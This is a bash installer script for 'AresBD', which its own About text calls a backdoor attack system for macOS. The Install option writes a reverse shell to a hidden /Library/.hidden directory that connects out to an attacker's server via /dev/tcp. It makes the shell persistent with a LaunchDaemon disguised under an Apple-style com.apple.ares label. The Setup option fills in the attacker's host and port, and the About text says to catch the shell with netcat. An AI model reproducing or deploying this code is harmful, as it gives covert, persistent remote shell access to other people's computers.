#!/bin/bash
#AresBD Gui by Stsosz

if [[ $UID != 0 ]]; then
    echo "Please run this script with sudo:"
    echo "sudo $0 $*"
    exit 1
fi

clear
echo "Loading..."
sleep .5

clear
echo 'AresBD Installer GUI'
echo 'Choose an Option:'
PS3=': '
options=("Install" "Uninstall" "Setup" "About" "Quit")
select opt in "${options[@]}"
do
    case $opt in
		
        "Install")
			
			clear
			sleep .5
            echo "Executing Installer..."
			sleep .5
			echo "======================"
			echo "Creating hidden directory..."
			
			mkdir /Library/.hidden
			
			sleep .5
			echo "Done"
			echo "======================"
			echo "Moving server script to hidden dir..."
			
			echo 
'#!/bin/bash
bash -i >& /dev/tcp/URL/PORT 0>&1
wait
			' > /Library/.hidden/connect.sh
			
			sleep .5
			echo "Done"
			echo "======================"
			echo "Setting permissions..."
			
			chmod +x /Library/.hidden/connect.sh

			sleep .5
			echo "Done"
			echo "======================"
			echo "Creating LaunchDaemons dir..."
			
			mkdir /Library/LaunchDaemons
			
			sleep .5
			echo "Done"
			echo "======================"
			echo "Creating AutoStart plist..."
			
			echo 
"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.apple.ares</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>/Library/.hidden/connect.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>INT</integer>
	<key>AbandonProcessGroup</key>
	<true/>
</dict>
</plist>
			" > /Library/LaunchDaemons/com.apple.ares.plist
			
			sleep .5
			echo "Done"
			echo "======================"
			echo "Setting Permissions..."
 
			chmod 600 /Library/LaunchDaemons/com.apple.ares.plist
			
			sleep .5
			echo "Done"
			echo "======================"
			echo "Loading plist to LaunchCTL..."
			
			launchctl load /Library/LaunchDaemons/com.apple.ares.plist
			
			sleep .5
			echo "Install Complete"
			
            ;;
			
        "Uninstall")
		
			clear
			sleep .5
            echo "Executing Uninstaller..."
			sleep .5
			echo "======================"
			echo "Unoading plist from LaunchCTL..."
			
			launchctl remove com.apple.ares
			
			sleep .5
			echo "Removing hidden directory..."
			
			rm -rf /Library/.hidden
			
			sleep .5
			echo "Done"
			echo "======================"
			echo "Removing plist"

			rm -rf /Library/LaunchDaemons/com.apple.ares.plist
 			
			sleep .5
			echo "======================"
			echo "Uninstall Complete"
			
            ;;
			
		"Setup")
				
			clear		
			echo "Running guisetup..."
			sleep .5
			echo "======================"
			echo "Creating temporary files..."
				
			cp gui_template.bash gui_working.bash

			sleep .5
			echo "======================"
			echo "Gathering server information..."

			echo "Enter server URL: "
			read URL

			sleep .5

			echo "Enter server listening port: "
			read PORT
				
			sleep .5
				
			echo "Enter refresh time (seconds): "
			read INT

			sleep .5
			echo "======================"
			echo "Executing..."
				
			sed -i -e "s/URL/$URL/g" gui_working.bash

			sed -i -e "s/PORT/$PORT/g" gui_working.bash
				
			sed -i -e "s/INT/$INT/g" gui_working.bash

			sleep .5
			echo "======================"
			echo "Renaming temporary files..."
				
			mv gui_working.bash $URL-$PORT-guiinstaller.bash 
			rm -rf gui_working.bash-e

			sleep .5
			echo "======================"
			echo "Done."
			echo "Please execute the script titled $URL-$PORT-guiinstaller.bash to run your custom installer."
				
	            ;;
			
        "About")
		
			clear
            echo "About AresBD"
			sleep .1
			echo "AresBD is a backdoor attack system for most OSX systems"
			sleep .1
			echo "AresBD works by opening a connection using "
			sleep .1
			echo "Catch your shell on your VPS by executing: nc -l -p <Your Port>"
			sleep .1
			
            ;;
			
        "Quit")
			
			clear
			echo "Exiting..."
			sleep 1
            break
            ;;
			
        *) echo invalid option;;
    esac
done